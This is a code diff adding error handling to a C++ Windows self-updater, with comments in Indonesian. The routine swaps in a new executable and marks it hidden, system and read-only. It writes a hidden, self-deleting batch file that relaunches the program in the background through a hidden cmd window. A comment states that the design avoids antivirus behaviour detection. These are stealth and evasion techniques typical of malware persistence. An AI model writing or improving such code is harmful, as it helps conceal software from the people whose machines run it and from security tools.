@@ -131,9 +131,9 @@ void RegisterUpdateOnReboot(std::wstring source, std::wstring destination) {
     MoveFileExW(source.c_str(), destination.c_str(), MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING);
 }
 
-void ApplyUpdate(std::wstring newExePath) {
+bool ApplyUpdate(std::wstring newExePath) {
     if (!std::filesystem::exists(newExePath) || std::filesystem::file_size(newExePath) == 0) {
-        return;
+        return false;  // File doesn't exist or is empty
     }
 
     wchar_t myPathRaw[MAX_PATH];
@@ -147,41 +147,57 @@ void ApplyUpdate(std::wstring newExePath) {
 
     // 2. BERSIHKAN ATRIBUT (WinAPI - Jauh lebih aman dari attrib.exe)
     // Kita buat NORMAL dulu agar bisa di-rename/delete
+    // Note: This might fail if file is locked, but we continue anyway since RegisterUpdateOnReboot provides fallback
     SetFileAttributesW(currentExePath.c_str(), FILE_ATTRIBUTE_NORMAL);
 
     // 3. TEKNIK RENAME-SELF
     // Windows mengizinkan EXE yang sedang berjalan untuk di-RENAME, tapi tidak untuk di-DELETE.
     // Kita pindahkan exe yang sedang berjalan ke nama lain (.old)
-    if (MoveFileExW(currentExePath.c_str(), backupPath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
+    if (!MoveFileExW(currentExePath.c_str(), backupPath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
+        // Failed to rename current exe - this is the most common failure point
+        return false;  // Exit early, don't attempt further file operations
+    }
+    
+    // 4. PASANG EXE BARU
+    // Sekarang lokasi asli sudah kosong, kita pindahkan file baru ke sana.
+    if (!MoveFileExW(newExePath.c_str(), currentExePath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
+        // Failed to move new exe - restore old exe with proper attributes
+        MoveFileExW(backupPath.c_str(), currentExePath.c_str(), MOVEFILE_REPLACE_EXISTING);
+        SetFileAttributesW(currentExePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
+        return false;
+    }
+    
+    // 5. KEMBALIKAN PROTEKSI (Sistem + Tersembunyi + ReadOnly)
+    SetFileAttributesW(currentExePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
+
+    // 6. CLEANUP & RESTART (Batch Minimalis)
+    // Batch ini hanya menghapus .old dan menjalankan kembali program.
+    // Tidak ada lagi 'taskkill' atau 'attrib' di sini sehingga aman dari deteksi perilaku AV.
+    std::filesystem::path batPath = std::filesystem::path(currentExePath).parent_path() / L"upd_finish.bat";
+    std::ofstream bat(batPath);
+    if (bat.is_open()) {
+        bat << "@echo off\n";
+        bat << "timeout /t 1 /nobreak > nul\n";
+        bat << "del \"" << Ws2S(backupPath) << "\" >nul 2>&1\n";
+        bat << "start /b \"\" \"" << Ws2S(currentExePath) << "\" --background\n";
+        bat << "(goto) 2>nul & del \"%~f0\"\n";
+        bat.close();
+
+        SetFileAttributesW(batPath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
         
-        // 4. PASANG EXE BARU
-        // Sekarang lokasi asli sudah kosong, kita pindahkan file baru ke sana.
-        if (MoveFileExW(newExePath.c_str(), currentExePath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
-            
-            // 5. KEMBALIKAN PROTEKSI (Sistem + Tersembunyi + ReadOnly)
-            SetFileAttributesW(currentExePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
-
-            // 6. CLEANUP & RESTART (Batch Minimalis)
-            // Batch ini hanya menghapus .old dan menjalankan kembali program.
-            // Tidak ada lagi 'taskkill' atau 'attrib' di sini sehingga aman dari deteksi perilaku AV.
-            std::filesystem::path batPath = std::filesystem::path(currentExePath).parent_path() / L"upd_finish.bat";
-            std::ofstream bat(batPath);
-            if (bat.is_open()) {
-                bat << "@echo off\n";
-                bat << "timeout /t 1 /nobreak > nul\n";
-                bat << "del \"" << Ws2S(backupPath) << "\" >nul 2>&1\n";
-                bat << "start /b \"\" \"" << Ws2S(currentExePath) << "\" --background\n";
-                bat << "(goto) 2>nul & del \"%~f0\"\n";
-                bat.close();
-
-                SetFileAttributesW(batPath.wstring().c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-                ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c \"" + batPath.wstring() + L"\"").c_str(), NULL, SW_HIDE);
-            }
-            
-            _exit(0);
+        // Execute batch file and exit
+        // Use ShellExecuteW with proper error checking
+        HINSTANCE result = ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c \"" + batPath.wstring() + L"\"").c_str(), NULL, SW_HIDE);
+        if ((intptr_t)result > 32) {  // Success if result > 32
+            // Give batch a moment to start
+            Sleep(100);
+            _exit(0);  // Exit the current process cleanly
         } else {
-            // Jika gagal memindahkan exe baru, kembalikan atribut file lama agar tetap tersembunyi
-            SetFileAttributesW(backupPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+            // ShellExecute failed - fallback: try direct replacement
+            return false;
         }
     }
+    
+    // If we reach here, batch creation failed
+    return false;
 }
